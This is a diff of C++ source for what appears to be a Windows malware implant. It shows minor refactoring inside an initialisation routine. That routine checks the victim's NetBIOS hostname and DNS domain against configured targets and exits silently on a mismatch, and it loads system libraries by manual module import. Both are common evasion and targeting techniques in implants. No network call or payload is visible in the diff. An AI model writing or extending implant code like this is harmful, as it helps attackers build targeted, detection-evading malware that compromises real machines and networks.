@@ -4,6 +4,7 @@ using namespace Xtea;
 using namespace Opsec;
 using namespace Parser;
 using namespace Stream;
+using namespace Modules;
 using namespace Dispatcher;
 using namespace Memory::Context;
 
@@ -56,6 +57,9 @@ namespace Main {
     OSVERSIONINFOW os_version   = { };
     BOOL success = false;
 
+    DWORD name_len = MAX_PATH;
+    CHAR buffer[MAX_PATH] = { };
+
     PROCESSENTRY32 proc_entry   = { };
     proc_entry.dwSize           = sizeof(PROCESSENTRY32);
 
@@ -95,12 +99,9 @@ namespace Main {
         }
     }
 
-    DWORD name_len = MAX_PATH;
-    CHAR buffer[MAX_PATH] = { };
-
     if (ctx->enumapi.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &name_len)) {
         if (ctx->config.hostname[0]) {
-            if (MbsBoundCompare(buffer, ctx->config.hostname, MbsName_Len(ctx->config.hostname)) != 0) {
+            if (MbsBoundCompare(buffer, ctx->config.hostname, MbsLength(ctx->config.hostname)) != 0) {
                 // LOG ERROR (bad host)
                 success = true;
                 goto defer;
@@ -117,7 +118,7 @@ namespace Main {
 
     if (ctx->enumapi.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
         if (ctx->network.domain[0]) {
-            if (MbsBoundCompare(ctx->network.domain, buffer, MbsName_Len(ctx->network.domain)) != 0) {
+            if (MbsBoundCompare(ctx->network.domain, buffer, MbsLength(ctx->network.domain)) != 0) {
                 // LOG ERROR (bad domain)
                 success = true;
                 goto defer;
@@ -172,7 +173,6 @@ namespace Main {
         x_assertb(ctx->modules.advapi   = (HMODULE) ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr)->base);
         x_assertb(ctx->modules.iphlpapi = (HMODULE) ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr)->base);
         x_assertb(ctx->modules.mscoree  = (HMODULE) ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr)->base);
-        x_assertb(ctx->modules.kernbase  = (HMODULE) ImportModule(LoadLocalFile, KERNBASE, nullptr, 0, nullptr)->base);
 
 #pragma region ioapi
 		x_assertb(F_PTR_HMOD(ctx->ioapi.FileTimeToSystemTime, 						ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
